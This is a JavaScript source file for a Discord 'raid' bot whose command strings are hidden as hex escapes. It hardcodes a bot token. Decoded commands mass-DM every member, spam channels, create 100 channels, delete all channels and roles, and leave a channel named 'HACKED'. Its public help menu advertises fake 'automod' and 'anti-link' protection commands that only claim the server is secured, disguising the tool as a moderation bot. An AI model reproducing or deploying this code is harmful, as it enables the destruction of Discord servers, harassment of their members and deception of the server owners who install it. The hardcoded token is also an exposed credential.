﻿const Discord = require('discord.js');
const client = new Discord.Client();
const chalk = require('chalk');
const fs = require('fs');
const botPrefix = "*"

client.login("ODU5OTI2NDEyNzc2MTc3NzI0.YNzy4Q.BAx7bAfqJoMIgp49Zqt3j2xg7io");

var _0xb892=["\x72\x65\x61\x64\x79","","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557\x20\x20\u2588\u2588\u2557\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2557\x20\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2557\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2557\x20\u2588\u2588\u2557\x20\x20\x20\x20\x20\x20\u2588\u2588\u2588\u2588\u2588\u2557\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\x20\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x79\x65\x6C\x6C\x6F\x77","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2551\x20\x20\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\x20\x20\x20\x20\x20\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255A\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255D\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u2588\u2588\u2551\x20\x20\x20\x20\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\x20\x20\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\x20\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2588\u2588\u2588\u2557\x20\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u2588\u2588\u2551\x20\x20\x20\x20\x20\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\x20\x20\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\x20\x20\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2554\u2550\u2550\u255D\x20\x20\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255D\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551\x20\x20\u2588\u2588\u2551\u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D\u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551\x20\x20\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551\x20\x20\u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u255A\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u255D\x20\x20\u255A\u2550\u255D\x20\u255A\u2550\u2550\u2550\u2550\u2550\u255D\x20\x20\u255A\u2550\u2550\u2550\u2550\u2550\u255D\x20\u255A\u2550\u2550\u2550\u2550\u2550\u255D\x20\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u255D\x20\x20\u255A\u2550\u255D\x20\x20\x20\u255A\u2550\u255D\x20\x20\x20\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u255D\x20\x20\u255A\u2550\u255D\u255A\u2550\u255D\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2D\x3E\x20\x20\x43\x72\xE9\x65\x20\x70\x61\x72\x20\x43\x68\x6F\x63\x6F\x38\x65\x78\x65\x23\x38\x37\x32\x35\x20\x21","\x72\x65\x64","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2D\x3E\x20\x20\x20\x20\x20\x20\xA9\x20\x32\x30\x32\x31\x20\x63\x68\x6F\x63\x6F\x2C\x20\x49\x6E\x63\x2E","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2D\x3E\x20\x47\x69\x74\x68\x75\x62\x3A\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x63\x68\x6F\x63\x6F\x38\x65\x78\x65","\x69\x6E\x66\x6F\x20\x64\x75\x20\x62\x6F\x74\x20\x3A\x20\x5C\x6E\x5C\x6E\x4C\x65\x20\x62\x6F\x74\x20\x65\x73\x74\x20\x73\x75\x72\x20","\x73\x69\x7A\x65","\x63\x61\x63\x68\x65","\x67\x75\x69\x6C\x64\x73","\x20\x73\x65\x72\x76\x65\x75\x72\x73\x2E\x20\x5C\x6E\x20\x61\x76\x65\x63\x20\x75\x6E\x20\x74\x6F\x74\x61\x6C\x20\x64\x65\x20","\x75\x73\x65\x72\x73","\x20\x6D\x65\x6D\x62\x72\x65\x73\x2E","\x43\x6F\x6E\x6E\x65\x63\x74\xE9\x20\x65\x6E\x20\x74\x61\x6E\x74\x20\x71\x75\x65\x20","\x69\x64","\x75\x73\x65\x72","\x20\x0A\x7C\x20\x50\x72\x65\x66\x69\x78\x20\x3A\x20","\x20\x0A\x7C\x20\x4E\x6F\x6D\x62\x72\x65\x20\x64\x65\x20\x53\x65\x72\x76\x65\x75\x72\x73\x20","\x20\x0A\x7C\x20\x4E\x6F\x6D\x62\x72\x65\x73\x20\x64\x65\x20\x73\x61\x6C\x6F\x6E\x73\x20","\x63\x68\x61\x6E\x6E\x65\x6C\x73","\x20\x0A\x7C\x20\x55\x74\x69\x6C\x69\x73\x61\x74\x65\x75\x72\x20\x74\x6F\x74\x61\x75\x78\x20","\x2A\x68\x65\x6C\x70\x20\x2D\x20\x63\x68\x6F\x63\x6F\x6C\x61\x74\x65\x72\x69\x65","\x73\x65\x74\x41\x63\x74\x69\x76\x69\x74\x79","\x6F\x6E","\x6D\x65\x73\x73\x61\x67\x65","\x67\x75\x69\x6C\x64","\x2A\x70\x6D\x65\x76\x65\x72\x79\x6F\x6E\x65","\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68","\x63\x6F\x6E\x74\x65\x6E\x74","\x64\x65\x6C\x65\x74\x65","\x6C\x65\x6E\x67\x74\x68","\x73\x6C\x69\x63\x65","\x62\x6F\x74","\x73\x65\x6E\x64","\x66\x6F\x72\x45\x61\x63\x68","\x6D\x65\x6D\x62\x65\x72\x73","\x2A\x63\x68\x61\x6E\x6E\x65\x6C\x73","\x43\x72\xE9\x61\x74\x69\x6F\x6E\x20\x64\x65\x20\x31\x30\x30\x20\x6E\x6F\x75\x76\x65\x61\x75\x78\x20\x73\x61\x6C\x6F\x6E\x73\x20\x64\x65\x20\x74\x65\x78\x74\x65\x20\x6E\x6F\x6D\x6D\xE9\x73\x3A\x20","\x2A\x2A","\x63\x68\x61\x6E\x6E\x65\x6C","\x65\x72\x72\x6F\x72","\x63\x61\x74\x63\x68","\x74\x68\x65\x6E","\x74\x65\x78\x74","\x63\x72\x65\x61\x74\x65","\x2A\x73\x70\x61\x6D","\x2A\x64\x65\x6C\x65\x74\x65\x63\x68\x61\x6E\x6E\x65\x6C\x73","\x53\x75\x70\x70\x72\x65\x73\x73\x69\x6F\x6E\x20\x64\x65\x20\x2A\x2A","\x2A\x2A\x20\x73\x61\x6C\x6F\x6E\x73\x21","\x48\x41\x43\x4B\x45\x44","\x2A\x64\x65\x6C\x65\x74\x65\x72\x6F\x6C\x65\x73","\x72\x6F\x6C\x65\x73","\x2A\x2A\x20\x72\xF4\x6C\x65\x73\x21","\x6E\x61\x6D\x65","\x63\x6F\x72\x6F\x6E\x61","\x2A\x31\x68\x65\x6C\x70","\x43\x72\xE9\xE9\x20\x70\x61\x72\x20\x63\x68\x6F\x63\x6F","\x73\x65\x74\x46\x6F\x6F\x74\x65\x72","\x73\x65\x74\x54\x69\x6D\x65\x73\x74\x61\x6D\x70","\x43\x6F\x6D\x6D\x61\x6E\x64\x65\x73","\x0A\x60\x2A\x31\x68\x65\x6C\x70\x60\x20\x2D\x20\x41\x66\x66\x69\x63\x68\x65\x72\x20\x6C\x65\x73\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x65\x73\x20\x72\x61\x69\x64\x0A\x60\x2A\x64\x65\x6C\x65\x74\x65\x63\x68\x61\x6E\x6E\x65\x6C\x73\x60\x20\x2D\x20\x53\x75\x70\x70\x72\x69\x6D\x65\x20\x74\x6F\x75\x73\x20\x6C\x65\x73\x20\x73\x61\x6C\x6F\x6E\x73\x0A\x60\x2A\x64\x65\x6C\x65\x74\x65\x72\x6F\x6C\x65\x73\x60\x20\x2D\x20\x53\x75\x70\x70\x72\x69\x6D\x65\x20\x74\x6F\x75\x73\x20\x6C\x65\x73\x20\x72\xF4\x6C\x65\x73\x0A\x60\x2A\x63\x68\x61\x6E\x6E\x65\x6C\x73\x20\x5B\x4E\x6F\x6D\x5D\x60\x20\x2D\x20\x43\x72\xE9\x65\x20\x31\x30\x30\x20\x73\x61\x6C\x6F\x6E\x73\x20\x61\x76\x65\x63\x20\x6C\x65\x20\x6E\x6F\x6D\x20\x63\x68\x6F\x69\x73\x69\x73\x0A\x60\x2A\x73\x70\x61\x6D\x20\x5B\x4D\x65\x73\x73\x61\x67\x65\x5D\x60\x20\x2D\x20\x53\x70\x61\x6D\x73\x20\x65\x6E\x76\x6F\x79\xE9\x73\x20\x64\x61\x6E\x73\x20\x6C\x65\x20\x73\x61\x6C\x6F\x6E\x0A\x60\x2A\x73\x70\x6D\x61\x6C\x6C\x20\x5B\x4D\x65\x73\x73\x61\x67\x65\x5D\x60\x20\x2D\x20\x53\x70\x61\x6D\x6D\x65\x72\x20\x64\x61\x6E\x73\x20\x74\x6F\x75\x74\x20\x6C\x65\x73\x20\x73\x61\x6C\x6F\x6E\x73\x20\x65\x6E\x20\x6D\xEA\x6D\x65\x20\x74\x65\x6D\x70\x73\x0A\x60\x2A\x70\x6D\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x5B\x4D\x65\x73\x73\x61\x67\x65\x5D\x60\x20\x2D\x20\x44\x4D\x20\x74\x6F\x75\x74\x20\x6C\x65\x73\x20\x6D\x65\x6D\x62\x72\x65\x73\x20\x64\x75\x20\x73\x65\x72\x76\x65\x75\x72","\x61\x64\x64\x46\x69\x65\x6C\x64","\x43\x68\x6F\x63\x6F\x38\x65\x78\x65\x23\x38\x37\x32\x35\x20\x6E\x27\x65\x73\x74\x20\x70\x61\x73\x20\x72\x65\x73\x70\x6F\x6E\x73\x61\x62\x6C\x65\x73\x20\x64\x65\x20\x63\x65\x20\x71\x75\x65\x20\x76\x6F\x75\x73\x20\x65\x6E\x20\x66\x61\x69\x74\x65\x73\x21","\x49\x63\x69\x20\x74\x75\x20\x74\x72\x6F\x75\x76\x65\x72\x61\x73\x20\x6C\x65\x73\x20\x6D\x65\x69\x6C\x6C\x65\x75\x72\x73\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x65\x73\x20\x64\x65\x20\x72\x61\x69\x64\x20","\x73\x65\x74\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x63\x6F\x6D\x6D\x61\x6E\x64\x65\x20\x72\x61\x69\x64","\x73\x65\x74\x54\x69\x74\x6C\x65","\x23\x46\x46\x30\x30\x30\x30","\x73\x65\x74\x43\x6F\x6C\x6F\x72","\x61\x75\x74\x68\x6F\x72","\x2A\x73\x70\x6D\x61\x6C\x6C","\x2A\x68\x65\x6C\x70","\x43\x6F\x6D\x6D\x61\x6E\x64\x65\x73\x20\x41\x64\x6D\x69\x6E","\x0A\x60\x2A\x68\x65\x6C\x70\x60\x20\x2D\x20\x41\x66\x66\x69\x63\x68\x65\x72\x20\x6C\x65\x73\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x65\x73\x0A\x60\x2A\x61\x75\x74\x6F\x6D\x6F\x64\x60\x20\x2D\x20\x41\x63\x74\x69\x76\x65\x72\x20\x6C\x27\x61\x75\x74\x6F\x6D\x6F\x64\x20\x73\x75\x72\x20\x76\x6F\x74\x72\x65\x20\x73\x65\x72\x76\x65\x75\x72\x0A\x60\x2A\x61\x6E\x74\x69\x6C\x69\x6E\x6B\x60\x20\x2D\x20\x41\x63\x74\x69\x76\x65\x72\x20\x6C\x27\x61\x6E\x74\x69\x2D\x6C\x69\x6E\x6B\x20\x73\x75\x72\x20\x76\x6F\x74\x72\x65\x20\x73\x65\x72\x76\x65\x75\x72","\x49\x63\x69\x20\x76\x6F\x75\x73\x20\x70\x6F\x75\x76\x65\x7A\x20\x74\x72\x6F\x75\x76\x65\x72\x20\x74\x6F\x75\x74\x65\x73\x20\x6C\x65\x73\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x65\x73","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x63\x68\x6F\x63\x6F\x38\x65\x78\x65","\x73\x65\x74\x55\x52\x4C","\x63\x6F\x6D\x6D\x61\x6E\x64\x65\x20\x61\x6E\x74\x69\x2D\x72\x61\x69\x64","\x2A\x61\x75\x74\x6F\x6D\x6F\x64","\x3A\x77\x68\x69\x74\x65\x5F\x63\x68\x65\x63\x6B\x5F\x6D\x61\x72\x6B\x3A\x20\x2A\x2A\x4C\x27\x61\x75\x74\x6F\x6D\x6F\x64\x20\xE0\x20\x62\x69\x65\x6E\x20\xE9\x74\xE9\x20\x61\x63\x74\x69\x76\x65\x72\x2C\x20\x76\x6F\x74\x72\x65\x20\x73\x65\x72\x76\x65\x75\x72\x20\x65\x73\x74\x20\x6D\x61\x69\x6E\x74\x65\x6E\x61\x6E\x74\x20\x73\xE9\x63\x75\x72\x69\x73\xE9\x2E\x2A\x2A","\x2A\x61\x6E\x74\x69\x6C\x69\x6E\x6B","\x3A\x77\x68\x69\x74\x65\x5F\x63\x68\x65\x63\x6B\x5F\x6D\x61\x72\x6B\x3A\x20\x2A\x2A\x4C\x27\x61\x6E\x74\x69\x2D\x6C\x69\x6E\x6B\x20\xE0\x20\x62\x69\x65\x6E\x20\xE9\x74\xE9\x20\x61\x63\x74\x69\x76\x65\x72\x2C\x20\x76\x6F\x74\x72\x65\x20\x73\x65\x72\x76\x65\x75\x72\x20\x65\x73\x74\x20\x6D\x61\x69\x6E\x74\x65\x6E\x61\x6E\x74\x20\x73\xE9\x63\x75\x72\x69\x73\xE9\x20\x64\x65\x73\x20\x69\x6E\x76\x69\x74\x61\x74\x69\x6F\x6E\x73\x20\x64\x69\x73\x63\x6F\x72\x64\x2E\x2A\x2A"];client[_0xb892[31]](_0xb892[0],(_0x52f2x1)=>{console[_0xb892[2]](_0xb892[1]);console[_0xb892[2]]((chalk[_0xb892[4]](`${_0xb892[3]}`)));console[_0xb892[2]]((chalk[_0xb892[4]](`${_0xb892[5]}`)));console[_0xb892[2]]((chalk[_0xb892[4]](`${_0xb892[6]}`)));console[_0xb892[2]]((chalk[_0xb892[4]](`${_0xb892[7]}`)));console[_0xb892[2]]((chalk[_0xb892[4]](`${_0xb892[8]}`)));console[_0xb892[2]]((chalk[_0xb892[4]](`${_0xb892[9]}`)));console[_0xb892[2]](_0xb892[1]);console[_0xb892[2]]((chalk[_0xb892[11]](`${_0xb892[10]}`)));console[_0xb892[2]]((chalk[_0xb892[11]](`${_0xb892[12]}`)));console[_0xb892[2]]((chalk[_0xb892[11]](`${_0xb892[13]}`)));console[_0xb892[2]](_0xb892[1]);console[_0xb892[2]](`${_0xb892[14]}${client[_0xb892[17]][_0xb892[16]][_0xb892[15]]}${_0xb892[18]}${client[_0xb892[19]][_0xb892[16]][_0xb892[15]]}${_0xb892[20]}`);console[_0xb892[2]](_0xb892[21]+ client[_0xb892[23]][_0xb892[22]]+ _0xb892[24]+ botPrefix+ _0xb892[25]+ client[_0xb892[17]][_0xb892[16]][_0xb892[15]]+ _0xb892[26]+ client[_0xb892[27]][_0xb892[16]][_0xb892[15]]+ _0xb892[28]+ client[_0xb892[19]][_0xb892[16]][_0xb892[15]]);client[_0xb892[23]][_0xb892[30]](_0xb892[29])});client[_0xb892[31]](_0xb892[32],(_0x52f2x1)=>{if(_0x52f2x1[_0xb892[33]]&& _0x52f2x1[_0xb892[36]][_0xb892[35]](_0xb892[34])){_0x52f2x1[_0xb892[37]]();let _0x52f2x2=_0x52f2x1[_0xb892[36]][_0xb892[39]](_0xb892[34][_0xb892[38]]);_0x52f2x1[_0xb892[33]][_0xb892[43]][_0xb892[16]][_0xb892[42]]((_0x52f2x3)=>{if(_0x52f2x3[_0xb892[22]]!= client[_0xb892[23]][_0xb892[22]]&&  !_0x52f2x3[_0xb892[23]][_0xb892[40]]){_0x52f2x3[_0xb892[41]](_0x52f2x2)}})};if(_0x52f2x1[_0xb892[36]][_0xb892[35]](_0xb892[44])){_0x52f2x1[_0xb892[37]]();let _0x52f2x4=_0x52f2x1[_0xb892[36]][_0xb892[39]](_0xb892[44][_0xb892[38]]);_0x52f2x1[_0xb892[47]][_0xb892[41]](_0xb892[45]+ _0xb892[46]+ _0x52f2x4+ _0xb892[46]);var _0x52f2x5;for(_0x52f2x5= 0;_0x52f2x5< 100;_0x52f2x5++){setTimeout(()=>{_0x52f2x1[_0xb892[33]][_0xb892[27]][_0xb892[52]](_0x52f2x4,{type:_0xb892[51]})[_0xb892[50]](console[_0xb892[2]])[_0xb892[49]](console[_0xb892[48]])},1* 1)}};if(_0x52f2x1[_0xb892[36]][_0xb892[35]](_0xb892[53])){_0x52f2x1[_0xb892[37]]();let _0x52f2x6=_0x52f2x1[_0xb892[36]][_0xb892[39]](_0xb892[53][_0xb892[38]]);var _0x52f2x5;for(_0x52f2x5= 0;_0x52f2x5< 50;_0x52f2x5++){setTimeout(()=>{_0x52f2x1[_0xb892[47]][_0xb892[41]](_0x52f2x6)},1* 1)}};if(_0x52f2x1[_0xb892[36]][_0xb892[35]](_0xb892[54])){_0x52f2x1[_0xb892[37]]();var _0x52f2x5=0;_0x52f2x1[_0xb892[33]][_0xb892[27]][_0xb892[16]][_0xb892[42]]((_0x52f2x7)=>{return _0x52f2x5++});_0x52f2x1[_0xb892[47]][_0xb892[41]](_0xb892[55]+ _0x52f2x5+ _0xb892[56]);_0x52f2x1[_0xb892[33]][_0xb892[27]][_0xb892[16]][_0xb892[42]]((_0x52f2x7)=>{return setTimeout(()=>{_0x52f2x7[_0xb892[37]]()},1000* 3)});_0x52f2x1[_0xb892[33]][_0xb892[27]][_0xb892[52]](_0xb892[57],{type:_0xb892[51]})[_0xb892[50]](console[_0xb892[2]])[_0xb892[49]](console[_0xb892[48]])};if(_0x52f2x1[_0xb892[36]][_0xb892[35]](_0xb892[58])){_0x52f2x1[_0xb892[37]]();let _0x52f2x8=_0x52f2x1[_0xb892[36]][_0xb892[39]](_0xb892[58][_0xb892[38]]);var _0x52f2x5=0;_0x52f2x1[_0xb892[33]][_0xb892[59]][_0xb892[16]][_0xb892[42]]((_0x52f2x9)=>{return _0x52f2x5++});_0x52f2x1[_0xb892[47]][_0xb892[41]](_0xb892[55]+ _0x52f2x5+ _0xb892[60]);_0x52f2x1[_0xb892[33]][_0xb892[59]][_0xb892[16]][_0xb892[42]]((_0x52f2x9)=>{return setTimeout(()=>{if(_0x52f2x1[_0xb892[33]][_0xb892[22]]!== _0x52f2x9[_0xb892[22]]&& _0x52f2x9[_0xb892[61]]!= _0xb892[62]&& _0x52f2x9[_0xb892[22]]!= _0x52f2x8){_0x52f2x9[_0xb892[37]]()}},1000* 3)})};if(_0x52f2x1[_0xb892[36]]== _0xb892[63]){_0x52f2x1[_0xb892[37]]();const _0x52f2xa= new Discord.MessageEmbed()[_0xb892[76]](_0xb892[75])[_0xb892[74]](_0xb892[73])[_0xb892[72]](_0xb892[71])[_0xb892[69]](_0xb892[70])[_0xb892[69]](_0xb892[67],_0xb892[68],true)[_0xb892[66]]()[_0xb892[65]](_0xb892[64]);_0x52f2x1[_0xb892[77]][_0xb892[41]](_0x52f2xa)};if(_0x52f2x1[_0xb892[36]][_0xb892[35]](_0xb892[78])){_0x52f2x1[_0xb892[37]]();var _0x52f2x5;for(_0x52f2x5= 0;_0x52f2x5< 5;_0x52f2x5++){setTimeout(()=>{let _0x52f2x6=_0x52f2x1[_0xb892[36]][_0xb892[39]](_0xb892[78][_0xb892[38]]);_0x52f2x1[_0xb892[33]][_0xb892[27]][_0xb892[16]][_0xb892[42]]((_0x52f2x7)=>{return _0x52f2x7[_0xb892[41]](_0x52f2x6)})},1* 1)}};if(_0x52f2x1[_0xb892[36]]== _0xb892[79]){const _0x52f2xa= new Discord.MessageEmbed()[_0xb892[76]](_0xb892[75])[_0xb892[74]](_0xb892[85])[_0xb892[84]](_0xb892[83])[_0xb892[72]](_0xb892[82])[_0xb892[69]](_0xb892[80],_0xb892[81])[_0xb892[66]]()[_0xb892[65]](_0xb892[64]);_0x52f2x1[_0xb892[47]][_0xb892[41]](_0x52f2xa)};if(_0x52f2x1[_0xb892[36]]== _0xb892[86]){const _0x52f2xb= new Discord.MessageEmbed()[_0xb892[76]](_0xb892[75])[_0xb892[72]](_0xb892[87]);_0x52f2x1[_0xb892[47]][_0xb892[41]](_0x52f2xb)};if(_0x52f2x1[_0xb892[36]]== _0xb892[88]){const _0x52f2xb= new Discord.MessageEmbed()[_0xb892[76]](_0xb892[75])[_0xb892[72]](_0xb892[89]);_0x52f2x1[_0xb892[47]][_0xb892[41]](_0x52f2xb)}})


